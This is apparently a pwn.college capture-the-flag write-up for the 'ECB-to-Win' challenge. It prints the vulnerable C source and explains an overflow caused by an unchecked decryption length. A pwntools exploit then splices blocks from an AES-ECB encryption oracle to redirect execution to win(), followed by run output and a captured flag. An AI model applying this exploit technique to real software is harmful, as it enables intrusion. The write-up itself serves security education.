---
custom_edit_url: null
sidebar_position: 6
slug: /pwn-college/intro-to-cybersecurity/integrated-security
---

## ECB-to-Win (Easy)

### Source code

```c title="/vulnerable-overflow.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <openssl/evp.h>

uint64_t sp_;
uint64_t bp_;
uint64_t sz_;
uint64_t cp_;
uint64_t cv_;
uint64_t si_;
uint64_t rp_;

#define GET_SP(sp) asm volatile ("mov %0, rsp" : "=r"(sp) : : );
#define GET_BP(bp) asm volatile ("mov %0, rbp" : "=r"(bp) : : );
#define GET_CANARY(cn) asm volatile ("mov %0, QWORD PTR [fs:0x28]" : "=r"(cn) : : );
#define GET_FRAME_WORDS(sz_, sp, bp, rp_) GET_SP(sp); GET_BP(bp); sz_ = (bp-sp)/8+2; rp_ = bp+8;
#define FIND_CANARY(cnp, cv, start)                                     \
  {                                                                     \
    cnp = start;                                                        \
    GET_CANARY(cv);                                                     \
    while (*(uint64_t *)cnp != cv) cnp = (uint64_t)cnp - 8;   \
  }

void DUMP_STACK(uint64_t sp, uint64_t n)
{
    printf("+---------------------------------+-------------------------+--------------------+\n");
    printf("| %31s | %23s | %18s |\n", "Stack location", "Data (bytes)", "Data (LE int)");
    printf("+---------------------------------+-------------------------+--------------------+\n");
    for (si_ = 0; si_ < n; si_++)
    {
        printf("| 0x%016lx (rsp+0x%04x) | %02x %02x %02x %02x %02x %02x %02x %02x | 0x%016lx |\n",
               sp+8*si_, 8*si_,
               *(uint8_t *)(sp+8*si_+0), *(uint8_t *)(sp+8*si_+1), *(uint8_t *)(sp+8*si_+2), *(uint8_t *)(sp+8*si_+3),
               *(uint8_t *)(sp+8*si_+4), *(uint8_t *)(sp+8*si_+5), *(uint8_t *)(sp+8*si_+6), *(uint8_t *)(sp+8*si_+7),
               *(uint64_t *)(sp+8*si_)
              );
    }
    printf("+---------------------------------+-------------------------+--------------------+\n");
}

#include <capstone/capstone.h>

#define CAPSTONE_ARCH CS_ARCH_X86
#define CAPSTONE_MODE CS_MODE_64

void print_disassembly(void *shellcode_addr, size_t shellcode_size)
{
    csh handle;
    cs_insn *insn;
    size_t count;

    if (cs_open(CAPSTONE_ARCH, CAPSTONE_MODE, &handle) != CS_ERR_OK)
    {
        printf("ERROR: disassembler failed to initialize.\n");
        return;
    }

    count = cs_disasm(handle, shellcode_addr, shellcode_size, (uint64_t)shellcode_addr, 0, &insn);
    if (count > 0)
    {
        size_t j;
        printf("      Address      |                      Bytes                    |          Instructions\n");
        printf("------------------------------------------------------------------------------------------\n");

        for (j = 0; j < count; j++)
        {
            printf("0x%016lx | ", (unsigned long)insn[j].address);
            for (int k = 0; k < insn[j].size; k++) printf("%02hhx ", insn[j].bytes[k]);
            for (int k = insn[j].size; k < 15; k++) printf("   ");
            printf(" | %s %s\n", insn[j].mnemonic, insn[j].op_str);
        }

        cs_free(insn, count);
    }
    else
    {
        printf("ERROR: Failed to disassemble shellcode! Bytes are:\n\n");
        printf("      Address      |                      Bytes\n");
        printf("--------------------------------------------------------------------\n");
        for (unsigned int i = 0; i <= shellcode_size; i += 16)
        {
            printf("0x%016lx | ", (unsigned long)shellcode_addr+i);
            for (int k = 0; k < 16; k++) printf("%02hhx ", ((uint8_t*)shellcode_addr)[i+k]);
            printf("\n");
        }
    }

    cs_close(&handle);
}

void win()
{
    static char flag[256];
    static int flag_fd;
    static int flag_length;

    puts("You win! Here is your flag:");
    flag_fd = open("/flag", 0);
    if (flag_fd < 0)
    {
        printf("\n  ERROR: Failed to open the flag -- %s!\n", strerror(errno));
        if (geteuid() != 0)
        {
            printf("  Your effective user id is not 0!\n");
            printf("  You must directly run the suid binary in order to have the correct permissions!\n");
        }
        exit(-1);
    }
    flag_length = read(flag_fd, flag, sizeof(flag));
    if (flag_length <= 0)
    {
        printf("\n  ERROR: Failed to read the flag -- %s!\n", strerror(errno));
        exit(-1);
    }
    write(1, flag, flag_length);
    printf("\n\n");
}

EVP_CIPHER_CTX *ctx;

int challenge(int argc, char **argv, char **envp)
{
    unsigned char key[16];
    struct
    {
        char header[8];
        unsigned long long length;
        char message[42];
    } plaintext = {0};

    // initialize the cipher
    int key_file = open("/challenge/.key", O_RDONLY);
    assert(key_file);
    assert(read(key_file, key, 16) == 16);
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    close(key_file);

    char *ciphertext = malloc(0x1000);
    size_t ciphertext_len = read(0, ciphertext, 0x1000);
    assert(ciphertext_len % 16 == 0);  // should be padded
    assert(ciphertext_len >= 16);      // at least one block

    // first, we verify the first block
    int decrypted_len;
    EVP_CIPHER_CTX_set_padding(ctx, 0);  // disable padding for the first block
    EVP_DecryptUpdate(ctx, (char *)&plaintext, &decrypted_len, ciphertext, 16);

    fprintf(stderr, "Your message header: %8s\n", plaintext.header);
    fprintf(stderr, "Your message length: %llu\n", plaintext.length);
    assert(memcmp(plaintext.header, "VERIFIED", 8) == 0); // verify header
    assert(plaintext.length <= 16); // verify length

    // decrypt the message!
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    memset(key, 0, sizeof(key));
    EVP_DecryptUpdate(ctx, plaintext.message, &decrypted_len, ciphertext + 16, ciphertext_len - 16);
    EVP_DecryptFinal_ex(ctx, plaintext.message + decrypted_len, &decrypted_len);

    printf("Decrypted message: %s!\n", plaintext.message);

    GET_FRAME_WORDS(sz_, sp_, bp_, rp_);
    DUMP_STACK(sp_, sz_);
    fprintf(stderr, "The program's memory status:\n");
    fprintf(stderr, "- the input buffer starts at %p\n", plaintext.message);
    fprintf(stderr, "- the saved return address (previously to main) is at %p\n", rp_);
    fprintf(stderr, "- the address of win() is %p.\n", win);

}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    challenge(argc, argv, envp);

}
```

We can see that the challenge defines a struct called `plaintext`, within which the first 8 bytes are allocated to the `header`, the next 8 are allocated to the `length`, and then `42` bytes are allocated to `message`.

```c showLineNumbers
# ---- snip ----

    struct
    {
        char header[8];
        unsigned long long length;
        char message[42];
    } plaintext = {0};

# ---- snip ----
```

It allocates 4096 bytes for the user provided ciphertext, and uses `ciphertext_len` gives the length of the user provided input.
It then ensures that `ciphertext_len >= 16` i.e. there is at least one block so that decryption can be performed.

```c showLineNumbers
# ---- snip ----

    char *ciphertext = malloc(0x1000);
    size_t ciphertext_len = read(0, ciphertext, 0x1000);
    assert(ciphertext_len % 16 == 0);  // should be padded
    assert(ciphertext_len >= 16);      // at least one block

# ---- snip ----
```

It then decrypts the first block of user provided ciphertext, places the resultant plaintext in the buffer defined before, and extracts the `plaintext.header` and `plaintext.length`. The challenge then checks if `plaintext.header == "VERIFIED"`, and `plaintext.length <= 16`, if not, it exits.

```c showLineNumbers
# ---- snip ----

    // initialize the cipher
    int key_file = open("/challenge/.key", O_RDONLY);
    assert(key_file);
    assert(read(key_file, key, 16) == 16);
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    close(key_file);

# ---- snip ----

    // first, we verify the first block
    int decrypted_len;
    EVP_CIPHER_CTX_set_padding(ctx, 0);  // disable padding for the first block
    EVP_DecryptUpdate(ctx, (char *)&plaintext, &decrypted_len, ciphertext, 16);

    fprintf(stderr, "Your message header: %8s\n", plaintext.header);
    fprintf(stderr, "Your message length: %llu\n", plaintext.length);
    assert(memcmp(plaintext.header, "VERIFIED", 8) == 0); // verify header
    assert(plaintext.length <= 16); // verify length

# ---- snip ----
```

Then, it goes on to decrypt the rest of the ciphertext (`ciphertext + 16`), and stores it into `plaintext.message`.
The problem here is that it uses `ciphertext_len - 16` here to assert the length of data to be decrypted instead of using the earlier defined `plaintext.length`. Since `ciphertext_len` is entirely controlled by the user input, we can send a message of any arbitrary size, which will be then stored into `plaintext.message[46]`, thus overflowing it.

```c showLineNumbers
# ---- snip ----

    // decrypt the message!
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL);
    memset(key, 0, sizeof(key));
    EVP_DecryptUpdate(ctx, plaintext.message, &decrypted_len, ciphertext + 16, ciphertext_len - 16);
    EVP_DecryptFinal_ex(ctx, plaintext.message + decrypted_len, &decrypted_len);

# ---- snip ----
```

There is another file called `/challenge/dispatch`, which gives us the ciphertext given any plaintext.



### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

# Initialize values
win_addr = 0x4018f7  

def get_encrypted_block(payload_bytes):
    """
    Interacts with the AES-ECB encryption oracle (dispatcher).
    Returns the raw ciphertext generated using the hidden system key.
    """
    io = process('/challenge/dispatch', level='error')
    io.send(payload_bytes) 
    ciphertext = io.readall()
    io.close()
    return ciphertext

print("[*] Harvesting ciphertext blocks from the ECB encryption oracle...")

# 1. AES block 0 (Offsets 0-15) - "VERIFIED" header and length
cipher_sample = get_encrypted_block(b"A")
header_block = cipher_sample[0:16]

# 2. AES block 1-6 (Offsets 16-111) - Padding
cipher_padding = get_encrypted_block(b"A" * 96)
overflow_padding = cipher_padding[16:112] 

# 3. AES block 7 (Offsets 112-127) - Return address payload
win_addr_block = b"B" * 8 
win_addr_block += p64(win_addr)
cipher_payload = get_encrypted_block(win_addr_block)
return_address_block = cipher_payload[16:32]

# 4. Final AES block - PKCS7 padding
padding_suffix = cipher_sample[-16:]

# Craft payload
final_ciphertext = header_block + overflow_padding + return_address_block + padding_suffix

# 5. Pass payload
print(f"[*] Dispatching assembled ciphertext ({len(final_ciphertext)} bytes) to target...")
p = process('/challenge/vulnerable-overflow')
p.send(final_ciphertext)

p.interactive()
```

```
hacker@integrated-security~ecb-to-win-easy:~$ python ~/script.py 
[*] Harvesting ciphertext blocks from the ECB encryption oracle...
[*] Dispatching assembled ciphertext (144 bytes) to target...
[+] Starting local process '/challenge/vulnerable-overflow': pid 40279
[*] Switching to interactive mode
[*] Process '/challenge/vulnerable-overflow' stopped with exit code -11 (SIGSEGV) (pid 40279)
Your message header: VERIFIED\x01
Your message length: 1
\xf1\x15A\xa6;\\xe0)\xf7\xe8\x16\x99j\xa6\xd8ڐ\xf1ca(0\x84L\xd3{q\xcd\x1e7\xee޷\x08\xfcQ!
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc7f497b10 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc7f497b18 (rsp+0x0008) | e8 7c 49 7f fc 7f 00 00 | 0x00007ffc7f497ce8 |
| 0x00007ffc7f497b20 (rsp+0x0010) | d8 7c 49 7f fc 7f 00 00 | 0x00007ffc7f497cd8 |
| 0x00007ffc7f497b28 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffc7f497b30 (rsp+0x0020) | ff ff ff ff 00 00 00 00 | 0x00000000ffffffff |
| 0x00007ffc7f497b38 (rsp+0x0028) | a0 86 45 61 01 00 00 00 | 0x00000001614586a0 |
| 0x00007ffc7f497b40 (rsp+0x0030) | 56 45 52 49 46 49 45 44 | 0x4445494649524556 |
| 0x00007ffc7f497b48 (rsp+0x0038) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007ffc7f497b50 (rsp+0x0040) | eb 0b 3d 7e 32 6a 68 cb | 0xcb686a327e3d0beb |
| 0x00007ffc7f497b58 (rsp+0x0048) | 0d f1 15 41 a6 3b 5c e0 | 0xe05c3ba64115f10d |
| 0x00007ffc7f497b60 (rsp+0x0050) | 29 f7 e8 16 99 6a a6 d8 | 0xd8a66a9916e8f729 |
| 0x00007ffc7f497b68 (rsp+0x0058) | da 90 f1 63 61 28 30 84 | 0x8430286163f190da |
| 0x00007ffc7f497b70 (rsp+0x0060) | 4c d3 7b 71 cd 1e 37 ee | 0xee371ecd717bd34c |
| 0x00007ffc7f497b78 (rsp+0x0068) | de b7 08 fc 51 00 f0 2d | 0x2df00051fc08b7de |
| 0x00007ffc7f497b80 (rsp+0x0070) | 3a fb db 72 06 a5 28 94 | 0x9428a50672dbfb3a |
| 0x00007ffc7f497b88 (rsp+0x0078) | 3f be a6 8d 4f 19 53 93 | 0x9353194f8da6be3f |
| 0x00007ffc7f497b90 (rsp+0x0080) | fe 45 3f 68 8c 06 13 ea | 0xea13068c683f45fe |
| 0x00007ffc7f497b98 (rsp+0x0088) | 60 e7 49 a4 88 33 1a 01 | 0x011a3388a449e760 |
| 0x00007ffc7f497ba0 (rsp+0x0090) | ad 15 81 c7 1b d4 32 01 | 0x0132d41bc78115ad |
| 0x00007ffc7f497ba8 (rsp+0x0098) | f3 51 0c b5 c1 61 1a 6f | 0x6f1a61c1b50c51f3 |
| 0x00007ffc7f497bb0 (rsp+0x00a0) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffc7f497bb8 (rsp+0x00a8) | f7 18 40 00 00 00 00 00 | 0x00000000004018f7 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffc7f497b50
- the saved return address (previously to main) is at 0x7ffc7f497bb8
- the address of win() is 0x4018f7.
You win! Here is your flag:
pwn.college{sBaSZzvEAX-48KsnbTM_0LFAcSD.QX3UDMxEDL4ITM0EzW}


[*] Got EOF while reading in interactive
$  
```